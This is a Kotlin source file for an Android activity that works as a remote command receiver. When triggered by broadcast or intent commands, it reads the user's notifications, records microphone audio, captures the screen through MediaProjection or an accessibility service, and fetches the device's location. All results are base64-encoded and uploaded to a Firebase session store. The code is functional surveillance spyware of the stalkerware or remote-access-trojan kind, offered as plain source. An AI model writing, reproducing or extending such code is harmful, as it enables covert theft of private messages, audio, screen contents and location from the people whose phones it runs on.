package com.jonas.x24
import android.view.Display

import android.Manifest
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.firebase.database.FirebaseDatabase
import com.jonas.x24.services.x24AccessibilityService
import com.jonas.x24.services.x24NotificationService
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream

class CommandReceiverActivity : AppCompatActivity() {

    private lateinit var sessionKey: String
    private var mediaProjectionManager: MediaProjectionManager? = null

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val command = intent?.getStringExtra("COMMAND")
            val newSessionKey = intent?.getStringExtra("SESSION_KEY")

            if (newSessionKey != null) {
                sessionKey = newSessionKey
            }

            if (command != null && ::sessionKey.isInitialized) {
                when (command) {
                    "READ_NOTIFICATIONS" -> readNotifications()
                    "RECORD_AUDIO" -> recordAudio()
                    "SCREENSHOT_MP" -> startMediaProjectionScreenshot()
                    "SCREENSHOT_A11Y" -> takeA11yScreenshot()
                "GET_LOCATION" -> getLocation()
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val filter = IntentFilter("com.jonas.x24.COMMAND_RECEIVED")
        androidx.core.content.ContextCompat.registerReceiver(this, receiver, filter, androidx.core.content.ContextCompat.RECEIVER_EXPORTED)

        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        intent?.let { handleIntent(it) }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleIntent(intent)
    }

    private fun handleIntent(intent: Intent) {
        val command = intent.getStringExtra("COMMAND")
        val newSessionKey = intent.getStringExtra("SESSION_KEY")

        if (newSessionKey != null) {
            sessionKey = newSessionKey
        }

        if (command != null && ::sessionKey.isInitialized) {
            when (command) {
                "READ_NOTIFICATIONS" -> readNotifications()
                "RECORD_AUDIO" -> recordAudio()
                "SCREENSHOT_MP" -> startMediaProjectionScreenshot()
                "SCREENSHOT_A11Y" -> takeA11yScreenshot()
                "GET_LOCATION" -> getLocation()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
    }

    private fun postResult(type: String, data: String) {
        if (!::sessionKey.isInitialized) return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }

    private fun getLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "Location permissions denied")
            finish()
            return
        }

        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var location: Location? = null
        try {
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch(e: Exception) {
            Log.e("CommandReceiver", "Location error", e)
        }

        if (location != null) {
            val geocoder = Geocoder(this, java.util.Locale.getDefault())
            try {
                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                if (!addresses.isNullOrEmpty()) {
                    val address = addresses[0]
                    val locStr = "${address.locality ?: "Unknown City"}, ${address.adminArea ?: ""}"
                    postResult("TEXT", "Location: $locStr\nCoords: ${location.latitude}, ${location.longitude}")
                    finish()
                    return
                }
            } catch (e: Exception) { }
            postResult("TEXT", "Coords: ${location.latitude}, ${location.longitude}")
        } else {
            postResult("ERROR", "Could not determine location")
        }
        finish()
    }

    private fun readNotifications() {
        val notifs = x24NotificationService.instance?.getActiveNotificationsList() ?: emptyList()
        val text = if (notifs.isEmpty()) {
            "No active notifications."
        } else {
            notifs.joinToString("\n")
        }
        postResult("TEXT", text)
        finish()
    }

    private fun recordAudio() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "Audio permission denied")
            return
        }

        val outputFile = File.createTempFile("audio_record", ".3gp", cacheDir)
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            recorder.setOutputFile(outputFile.absolutePath)
            recorder.prepare()
            recorder.start()

            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    recorder.stop()
                    recorder.release()

                    val bytes = FileInputStream(outputFile).readBytes()
                    val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                    postResult("AUDIO", base64)
                } catch (e: Exception) {
                    postResult("ERROR", "Recording failed: ${e.message}")
                } finally {
                    outputFile.delete()
                    finish()
                }
            }, 10000) // 10 seconds record time

        } catch (e: Exception) {
            postResult("ERROR", "Recorder error: ${e.message}")
            finish()
        }
    }

    private val SCREENSHOT_REQUEST_CODE = 1001

    private fun startMediaProjectionScreenshot() {
        mediaProjectionManager?.createScreenCaptureIntent()?.let { startActivityForResult(it, SCREENSHOT_REQUEST_CODE) }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREENSHOT_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                takeMediaProjectionScreenshot(resultCode, data)
            } else {
                postResult("ERROR", "Screen capture permission denied")
                finish()
            }
        }
    }

    private fun takeMediaProjectionScreenshot(resultCode: Int, data: Intent) {
        val mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
        if (mediaProjection == null) {
            postResult("ERROR", "Failed to get MediaProjection")
            finish()
            return
        }

        val metrics = DisplayMetrics()
        windowManager.defaultDisplay.getMetrics(metrics)
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        val virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        // Add a slight delay for the surface to render
        Handler(Looper.getMainLooper()).postDelayed({
            val image = imageReader.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()

                // Crop out row padding
                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)

                val outputStream = ByteArrayOutputStream()
                croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream)
                val base64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT)

                postResult("IMAGE", base64)

                virtualDisplay.release()
                mediaProjection.stop()
                finish()
            } else {
                postResult("ERROR", "Failed to acquire image")
                virtualDisplay.release()
                mediaProjection.stop()
                finish()
            }
        }, 1000)
    }

    private fun takeA11yScreenshot() {
        val service = x24AccessibilityService.instance
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            service.takeScreenshot(Display.DEFAULT_DISPLAY, applicationContext.mainExecutor, object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                    val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap != null) {
                        // Hardware bitmaps need to be converted to software to compress
                        val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                        val outputStream = ByteArrayOutputStream()
                        softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream)
                        val base64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT)
                        postResult("IMAGE", base64)
                    } else {
                        postResult("ERROR", "Failed to create bitmap from screenshot")
                    }
                    finish()
                }

                override fun onFailure(errorCode: Int) {
                    postResult("ERROR", "Accessibility Screenshot Failed: Code $errorCode")
                    finish()
                }
            })
        } else {
            postResult("ERROR", "Accessibility service not running or unsupported Android version (requires 11+)")
            finish()
        }
    }
}
